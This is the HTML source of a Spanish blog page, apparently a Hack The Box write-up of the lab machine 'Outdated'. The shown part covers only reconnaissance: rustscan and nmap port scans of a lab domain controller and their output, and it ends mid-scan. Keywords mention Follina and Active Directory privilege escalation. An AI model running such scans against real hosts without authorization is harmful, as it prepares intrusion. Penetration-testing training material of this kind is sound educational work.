<!doctype html>
<html lang="es">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="/pointed.png" />

<title>Hack The Box: Outdated Writeup | Medium&nbsp;|&nbsp;Bajo el Teclado</title>
<meta
  name="title"
  content="Hack The Box: Outdated Writeup | Medium"
/>
<meta
  name="description"
  content="Hack The Box: Outdated Writeup
Welcome to my detailed writeup of the medium difficulty machine &ldquo;Outdated&rdquo; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration






1$ rustscan -a 10.129.229.239 --ulimit 5000 -g
210.129.229.239 -&gt; [25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49691,49692,49914,49940,49961]







 1cat allPorts
 2# Nmap 7.94SVN scan initiated Mon Aug 26 21:11:16 2024 as: nmap -p25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49691,49692,49914,49940,49961 -sCV -oN allPorts 10.129.229.239
 3Nmap scan report for 10.129.229.239
 4Host is up (0.040s latency).
 5
 6PORT      STATE SERVICE       VERSION
 725/tcp    open  smtp          hMailServer smtpd
 8| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
 9|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
1053/tcp    open  domain        Simple DNS Plus
1188/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-27 01:11:25Z)
12135/tcp   open  msrpc         Microsoft Windows RPC
13139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
14389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
15| ssl-cert: Subject: commonName=DC.outdated.htb
16| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
17| Not valid before: 2023-12-13T00:17:36
18|_Not valid after:  2024-12-12T00:17:36
19|_ssl-date: 2024-08-27T01:12:58&#43;00:00; &#43;6h00m02s from scanner time.
20445/tcp   open  microsoft-ds?
21464/tcp   open  kpasswd5?
22593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
23636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
24|_ssl-date: 2024-08-27T01:12:57&#43;00:00; &#43;6h00m01s from scanner time.
25| ssl-cert: Subject: commonName=DC.outdated.htb
26| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
27| Not valid before: 2023-12-13T00:17:36
28|_Not valid after:  2024-12-12T00:17:36
293268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
30| ssl-cert: Subject: commonName=DC.outdated.htb
31| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
32| Not valid before: 2023-12-13T00:17:36
33|_Not valid after:  2024-12-12T00:17:36
34|_ssl-date: 2024-08-27T01:12:58&#43;00:00; &#43;6h00m02s from scanner time.
353269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
36|_ssl-date: 2024-08-27T01:12:57&#43;00:00; &#43;6h00m02s from scanner time.
37| ssl-cert: Subject: commonName=DC.outdated.htb
38| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
39| Not valid before: 2023-12-13T00:17:36
40|_Not valid after:  2024-12-12T00:17:36
415985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
42|_http-title: Not Found
438530/tcp  open  http          Microsoft IIS httpd 10.0
44|_http-title: Site doesn&#39;t have a title.
45| http-methods: 
46|_  Potentially risky methods: TRACE
478531/tcp  open  unknown
489389/tcp  open  mc-nmf        .NET Message Framing
4949667/tcp open  msrpc         Microsoft Windows RPC
5049691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
5149692/tcp open  msrpc         Microsoft Windows RPC
5249914/tcp open  msrpc         Microsoft Windows RPC
5349940/tcp open  msrpc         Microsoft Windows RPC
5449961/tcp open  msrpc         Microsoft Windows RPC
55Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows
56
57Host script results:
58| smb2-security-mode: 
59|   3:1:1: 
60|_    Message signing enabled and required
61| smb2-time: 
62|   date: 2024-08-27T01:12:14
63|_  start_date: N/A
64|_clock-skew: mean: 6h00m01s, deviation: 0s, median: 6h00m01s
65
66Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
67# Nmap done at Mon Aug 26 21:12:56 2024 -- 1 IP address (1 host up) scanned in 100.77 seconds
UDP Enumeration






 1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.229.239 -oN allPorts.UDP
 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 21:12 CEST
 3Nmap scan report for 10.129.229.239
 4Host is up (0.039s latency).
 5Not shown: 1497 open|filtered udp ports (no-response)
 6PORT    STATE SERVICE
 753/udp  open  domain
 888/udp  open  kerberos-sec
 9123/udp open  ntp
10
11Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
Detectamos que nos enfrentamos contra un entorno de directorio activo ya que están puertos expuestos típicos como 88/TCP Keberos, 389/TCP LDAP."
/>
<meta
  name="keywords"
  content="HackTheBox,Outdated,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,RCE,Exploit,Windows,SMB Enumeration,CVE-2022-30190,Follina,Bloodhound,Abusing AddKeyCredentialLink,Writing msDS-KeyCredentialLink,User Pivoting,Abusing WSUS,Privilege Escalation,"
/>

  <meta name="author" content="Andrés Del Cerro" />




<meta property="og:url" content="http://localhost:1313/writeups/outdated---hackthebox/">
  <meta property="og:site_name" content="Bajo el Teclado">
  <meta property="og:title" content="Hack The Box: Outdated Writeup | Medium">
  <meta property="og:description" content="Hack The Box: Outdated Writeup Welcome to my detailed writeup of the medium difficulty machine “Outdated” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.229.239 --ulimit 5000 -g 210.129.229.239 -&gt; [25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49691,49692,49914,49940,49961] 1cat allPorts 2# Nmap 7.94SVN scan initiated Mon Aug 26 21:11:16 2024 as: nmap -p25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49691,49692,49914,49940,49961 -sCV -oN allPorts 10.129.229.239 3Nmap scan report for 10.129.229.239 4Host is up (0.040s latency). 5 6PORT STATE SERVICE VERSION 725/tcp open smtp hMailServer smtpd 8| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP 9|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 1053/tcp open domain Simple DNS Plus 1188/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-27 01:11:25Z) 12135/tcp open msrpc Microsoft Windows RPC 13139/tcp open netbios-ssn Microsoft Windows netbios-ssn 14389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 15| ssl-cert: Subject: commonName=DC.outdated.htb 16| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 17| Not valid before: 2023-12-13T00:17:36 18|_Not valid after: 2024-12-12T00:17:36 19|_ssl-date: 2024-08-27T01:12:58&#43;00:00; &#43;6h00m02s from scanner time. 20445/tcp open microsoft-ds? 21464/tcp open kpasswd5? 22593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 23636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 24|_ssl-date: 2024-08-27T01:12:57&#43;00:00; &#43;6h00m01s from scanner time. 25| ssl-cert: Subject: commonName=DC.outdated.htb 26| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 27| Not valid before: 2023-12-13T00:17:36 28|_Not valid after: 2024-12-12T00:17:36 293268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 30| ssl-cert: Subject: commonName=DC.outdated.htb 31| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 32| Not valid before: 2023-12-13T00:17:36 33|_Not valid after: 2024-12-12T00:17:36 34|_ssl-date: 2024-08-27T01:12:58&#43;00:00; &#43;6h00m02s from scanner time. 353269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 36|_ssl-date: 2024-08-27T01:12:57&#43;00:00; &#43;6h00m02s from scanner time. 37| ssl-cert: Subject: commonName=DC.outdated.htb 38| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 39| Not valid before: 2023-12-13T00:17:36 40|_Not valid after: 2024-12-12T00:17:36 415985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 42|_http-title: Not Found 438530/tcp open http Microsoft IIS httpd 10.0 44|_http-title: Site doesn&#39;t have a title. 45| http-methods: 46|_ Potentially risky methods: TRACE 478531/tcp open unknown 489389/tcp open mc-nmf .NET Message Framing 4949667/tcp open msrpc Microsoft Windows RPC 5049691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 5149692/tcp open msrpc Microsoft Windows RPC 5249914/tcp open msrpc Microsoft Windows RPC 5349940/tcp open msrpc Microsoft Windows RPC 5449961/tcp open msrpc Microsoft Windows RPC 55Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows 56 57Host script results: 58| smb2-security-mode: 59| 3:1:1: 60|_ Message signing enabled and required 61| smb2-time: 62| date: 2024-08-27T01:12:14 63|_ start_date: N/A 64|_clock-skew: mean: 6h00m01s, deviation: 0s, median: 6h00m01s 65 66Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 67# Nmap done at Mon Aug 26 21:12:56 2024 -- 1 IP address (1 host up) scanned in 100.77 secondsUDP Enumeration 1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.229.239 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 21:12 CEST 3Nmap scan report for 10.129.229.239 4Host is up (0.039s latency). 5Not shown: 1497 open|filtered udp ports (no-response) 6PORT STATE SERVICE 753/udp open domain 888/udp open kerberos-sec 9123/udp open ntp 10 11Nmap done: 1 IP address (1 host up) scanned in 0.96 secondsDetectamos que nos enfrentamos contra un entorno de directorio activo ya que están puertos expuestos típicos como 88/TCP Keberos, 389/TCP LDAP.">
  <meta property="og:locale" content="es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-08-26T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-08-26T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Outdated">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Cybersecurity">
    <meta property="article:tag" content="Penetration Testing">
    <meta property="article:tag" content="CTF">





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Hack The Box: Outdated Writeup | Medium">
  <meta name="twitter:description" content="Hack The Box: Outdated Writeup Welcome to my detailed writeup of the medium difficulty machine “Outdated” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.229.239 --ulimit 5000 -g 210.129.229.239 -&gt; [25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49691,49692,49914,49940,49961] 1cat allPorts 2# Nmap 7.94SVN scan initiated Mon Aug 26 21:11:16 2024 as: nmap -p25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49691,49692,49914,49940,49961 -sCV -oN allPorts 10.129.229.239 3Nmap scan report for 10.129.229.239 4Host is up (0.040s latency). 5 6PORT STATE SERVICE VERSION 725/tcp open smtp hMailServer smtpd 8| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP 9|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 1053/tcp open domain Simple DNS Plus 1188/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-27 01:11:25Z) 12135/tcp open msrpc Microsoft Windows RPC 13139/tcp open netbios-ssn Microsoft Windows netbios-ssn 14389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 15| ssl-cert: Subject: commonName=DC.outdated.htb 16| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 17| Not valid before: 2023-12-13T00:17:36 18|_Not valid after: 2024-12-12T00:17:36 19|_ssl-date: 2024-08-27T01:12:58&#43;00:00; &#43;6h00m02s from scanner time. 20445/tcp open microsoft-ds? 21464/tcp open kpasswd5? 22593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 23636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 24|_ssl-date: 2024-08-27T01:12:57&#43;00:00; &#43;6h00m01s from scanner time. 25| ssl-cert: Subject: commonName=DC.outdated.htb 26| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 27| Not valid before: 2023-12-13T00:17:36 28|_Not valid after: 2024-12-12T00:17:36 293268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 30| ssl-cert: Subject: commonName=DC.outdated.htb 31| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 32| Not valid before: 2023-12-13T00:17:36 33|_Not valid after: 2024-12-12T00:17:36 34|_ssl-date: 2024-08-27T01:12:58&#43;00:00; &#43;6h00m02s from scanner time. 353269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 36|_ssl-date: 2024-08-27T01:12:57&#43;00:00; &#43;6h00m02s from scanner time. 37| ssl-cert: Subject: commonName=DC.outdated.htb 38| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 39| Not valid before: 2023-12-13T00:17:36 40|_Not valid after: 2024-12-12T00:17:36 415985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 42|_http-title: Not Found 438530/tcp open http Microsoft IIS httpd 10.0 44|_http-title: Site doesn&#39;t have a title. 45| http-methods: 46|_ Potentially risky methods: TRACE 478531/tcp open unknown 489389/tcp open mc-nmf .NET Message Framing 4949667/tcp open msrpc Microsoft Windows RPC 5049691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 5149692/tcp open msrpc Microsoft Windows RPC 5249914/tcp open msrpc Microsoft Windows RPC 5349940/tcp open msrpc Microsoft Windows RPC 5449961/tcp open msrpc Microsoft Windows RPC 55Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows 56 57Host script results: 58| smb2-security-mode: 59| 3:1:1: 60|_ Message signing enabled and required 61| smb2-time: 62| date: 2024-08-27T01:12:14 63|_ start_date: N/A 64|_clock-skew: mean: 6h00m01s, deviation: 0s, median: 6h00m01s 65 66Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 67# Nmap done at Mon Aug 26 21:12:56 2024 -- 1 IP address (1 host up) scanned in 100.77 secondsUDP Enumeration 1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.229.239 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 21:12 CEST 3Nmap scan report for 10.129.229.239 4Host is up (0.039s latency). 5Not shown: 1497 open|filtered udp ports (no-response) 6PORT STATE SERVICE 753/udp open domain 888/udp open kerberos-sec 9123/udp open ntp 10 11Nmap done: 1 IP address (1 host up) scanned in 0.96 secondsDetectamos que nos enfrentamos contra un entorno de directorio activo ya que están puertos expuestos típicos como 88/TCP Keberos, 389/TCP LDAP.">





  <meta itemprop="name" content="Hack The Box: Outdated Writeup | Medium">
  <meta itemprop="description" content="Hack The Box: Outdated Writeup Welcome to my detailed writeup of the medium difficulty machine “Outdated” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.229.239 --ulimit 5000 -g 210.129.229.239 -&gt; [25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49691,49692,49914,49940,49961] 1cat allPorts 2# Nmap 7.94SVN scan initiated Mon Aug 26 21:11:16 2024 as: nmap -p25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49691,49692,49914,49940,49961 -sCV -oN allPorts 10.129.229.239 3Nmap scan report for 10.129.229.239 4Host is up (0.040s latency). 5 6PORT STATE SERVICE VERSION 725/tcp open smtp hMailServer smtpd 8| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP 9|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 1053/tcp open domain Simple DNS Plus 1188/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-27 01:11:25Z) 12135/tcp open msrpc Microsoft Windows RPC 13139/tcp open netbios-ssn Microsoft Windows netbios-ssn 14389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 15| ssl-cert: Subject: commonName=DC.outdated.htb 16| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 17| Not valid before: 2023-12-13T00:17:36 18|_Not valid after: 2024-12-12T00:17:36 19|_ssl-date: 2024-08-27T01:12:58&#43;00:00; &#43;6h00m02s from scanner time. 20445/tcp open microsoft-ds? 21464/tcp open kpasswd5? 22593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 23636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 24|_ssl-date: 2024-08-27T01:12:57&#43;00:00; &#43;6h00m01s from scanner time. 25| ssl-cert: Subject: commonName=DC.outdated.htb 26| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 27| Not valid before: 2023-12-13T00:17:36 28|_Not valid after: 2024-12-12T00:17:36 293268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 30| ssl-cert: Subject: commonName=DC.outdated.htb 31| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 32| Not valid before: 2023-12-13T00:17:36 33|_Not valid after: 2024-12-12T00:17:36 34|_ssl-date: 2024-08-27T01:12:58&#43;00:00; &#43;6h00m02s from scanner time. 353269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) 36|_ssl-date: 2024-08-27T01:12:57&#43;00:00; &#43;6h00m02s from scanner time. 37| ssl-cert: Subject: commonName=DC.outdated.htb 38| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb 39| Not valid before: 2023-12-13T00:17:36 40|_Not valid after: 2024-12-12T00:17:36 415985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 42|_http-title: Not Found 438530/tcp open http Microsoft IIS httpd 10.0 44|_http-title: Site doesn&#39;t have a title. 45| http-methods: 46|_ Potentially risky methods: TRACE 478531/tcp open unknown 489389/tcp open mc-nmf .NET Message Framing 4949667/tcp open msrpc Microsoft Windows RPC 5049691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 5149692/tcp open msrpc Microsoft Windows RPC 5249914/tcp open msrpc Microsoft Windows RPC 5349940/tcp open msrpc Microsoft Windows RPC 5449961/tcp open msrpc Microsoft Windows RPC 55Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows 56 57Host script results: 58| smb2-security-mode: 59| 3:1:1: 60|_ Message signing enabled and required 61| smb2-time: 62| date: 2024-08-27T01:12:14 63|_ start_date: N/A 64|_clock-skew: mean: 6h00m01s, deviation: 0s, median: 6h00m01s 65 66Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 67# Nmap done at Mon Aug 26 21:12:56 2024 -- 1 IP address (1 host up) scanned in 100.77 secondsUDP Enumeration 1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.229.239 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 21:12 CEST 3Nmap scan report for 10.129.229.239 4Host is up (0.039s latency). 5Not shown: 1497 open|filtered udp ports (no-response) 6PORT STATE SERVICE 753/udp open domain 888/udp open kerberos-sec 9123/udp open ntp 10 11Nmap done: 1 IP address (1 host up) scanned in 0.96 secondsDetectamos que nos enfrentamos contra un entorno de directorio activo ya que están puertos expuestos típicos como 88/TCP Keberos, 389/TCP LDAP.">
  <meta itemprop="datePublished" content="2024-08-26T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-08-26T00:00:00+00:00">
  <meta itemprop="wordCount" content="2885">
  <meta itemprop="keywords" content="HackTheBox,Outdated,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,RCE,Exploit,Windows,SMB Enumeration,CVE-2022-30190,Follina,Bloodhound,Abusing AddKeyCredentialLink,Writing MsDS-KeyCredentialLink,User Pivoting,Abusing WSUS,Privilege Escalation">
<meta name="referrer" content="no-referrer-when-downgrade" />

    
    <link href="/simple.min.css" rel="stylesheet" />

    
    <link href="/style.min.css" rel="stylesheet" />

    

    
</head>

  <body>
    <header>
      <nav>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZHDKLM7DD2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-ZHDKLM7DD2');
</script>


  <a
    href="/"
    
    >Home</a
  >

  <a
    href="/about/"
    
    >About me</a
  >

  <a
    href="/writeups/"
    
    >Writeup&#39;s</a
  >


</nav>
<div style="display: flex; justify-content: center; align-items: center">
  <div style="display: flex; width: 20rem; gap: 2rem;">
    <img src="yo.png" alt="">
    <h1>Hack The Box: Outdated Writeup | Medium</h1>
  </div>
</div>


    </header>
    <main>
      
  
  
  <content>
    <h1 id="hack-the-box-outdated-writeup">Hack The Box: Outdated Writeup</h1>
<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Outdated&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.229.239 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.229.239 -&gt; [25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49691,49692,49914,49940,49961]
</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>cat allPorts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#007f7f"># Nmap 7.94SVN scan initiated Mon Aug 26 21:11:16 2024 as: nmap -p25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49691,49692,49914,49940,49961 -sCV -oN allPorts 10.129.229.239</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.229.239
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.040s latency).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>25/tcp    open  smtp          hMailServer smtpd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>|_ <span style="color:#ff0;font-weight:bold">211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-27 01:11:25Z)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>| ssl-cert: Subject: commonName=DC.outdated.htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>| Not valid before: 2023-12-13T00:17:36
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>|_Not valid after:  2024-12-12T00:17:36
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>|_ssl-date: 2024-08-27T01:12:58+00:00; +6h00m02s from scanner time.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
